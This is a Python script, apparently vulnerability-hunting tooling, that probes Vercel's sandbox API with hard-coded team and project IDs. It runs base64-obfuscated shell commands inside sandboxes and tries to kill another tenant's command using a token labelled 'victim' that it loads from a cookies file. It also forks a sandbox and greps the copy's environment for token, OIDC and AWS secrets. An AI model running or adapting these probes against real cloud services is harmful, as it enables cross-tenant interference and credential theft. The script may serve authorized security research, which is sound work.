# -*- coding: utf-8 -*-
"""interactive 深挖 + kill 修复 + fork 数据复制 (v46c)"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'sdk46c'
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, ctype='application/json', headers=None, tok=None, timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    if ctype:
        req.add_header('Content-Type', ctype)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = body if isinstance(body, bytes) else (json.dumps(body).encode() if body is not None else None)
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:2000]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:2000]
    except Exception as e:
        return -1, 'EXC %s' % e

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

if __name__ == '__main__':
    # 清理上一轮遗留的 fork
    api_raw('DELETE', '/v2/sandboxes/sdk46bf?teamId=%s&projectId=%s' % (TEAM, PROJ))
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(10)

    print('=== P1: interactive ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {})
    print('[interactive] -> %d %s' % (c, (r or '')[:1500]), flush=True)

    print('=== P1b: guest 内 interactivePort 监听 ===', flush=True)
    b64 = base64.b64encode(b'ss -tlnp 2>/dev/null | head -20; echo ---; netstat -tlnp 2>/dev/null | head -20').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=25000)
    print('[listeners] %s' % parse_data(r).strip()[:400], flush=True)

    print('=== P2: kill 正确 body ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                   {"command": "sleep", "args": ["60"], "wait": False})
    cmd_id = None
    try:
        cmd_id = json.loads(r)['command']['id']
    except Exception:
        pass
    print('[cmd async] -> %d cmdId=%s' % (c, cmd_id), flush=True)
    if cmd_id:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd/%s/kill?teamId=%s' % (sid, cmd_id, TEAM),
                       {"signal": "SIGKILL"})
        print('[kill SIGKILL] -> %d %s' % (c, (r or '')[:150]), flush=True)
        c, r = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd/%s?teamId=%s' % (sid, cmd_id, TEAM))
        print('[get after kill] -> %d %s' % (c, (r or '')[:150]), flush=True)
        # 跨租户 kill
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd/%s/kill?teamId=%s' % (sid, cmd_id, TEAM_V),
                       {"signal": "SIGKILL"}, tok=TOK_V)
        print('[victim kill] -> %d %s' % (c, (r or '')[:150]), flush=True)

    print('=== P3: fork 数据复制 ===', flush=True)
    b64 = base64.b64encode(b'echo FORK_SOURCE_MARK > /tmp/fork_src.txt; mkdir -p /vercel/sandbox; echo MARK2 > /vercel/sandbox/fork_mark.txt').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
    print('[src mark] -> %d' % c, flush=True)
    time.sleep(3)
    c, r = api_raw('POST', '/v2/sandboxes/%s/fork?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ), {"name": NAME + 'f'}, timeout=120)
    print('[fork] -> %d' % c, flush=True)
    fsid = None
    if c == 200:
        try:
            fsid = json.loads(r)['sandbox']['currentSessionId']
            print('fork sid =', fsid, flush=True)
        except Exception:
            print('[fork parse ERR]', (r or '')[:300], flush=True)
    if fsid:
        time.sleep(12)
        b64 = base64.b64encode(b'cat /tmp/fork_src.txt 2>&1; echo ---; cat /vercel/sandbox/fork_mark.txt 2>&1; echo ---; env | grep -iE "token|oidc|aws" | head -5').decode()
        c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (fsid, TEAM),
                         {"command": "sh", "args": ["-c", 'echo %s | base64 -d | sh' % b64], "wait": True}, timeout=40000)
        out = ''
        for line in r2.splitlines():
            if '"data"' in line:
                try:
                    out += json.loads(line).get('data', '')
                except Exception:
                    pass
        print('[fork read] -> %d %s' % (c2, out.strip()[:300]), flush=True)
        api_raw('DELETE', '/v2/sandboxes/%sf?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        print('  (fork cleaned)', flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
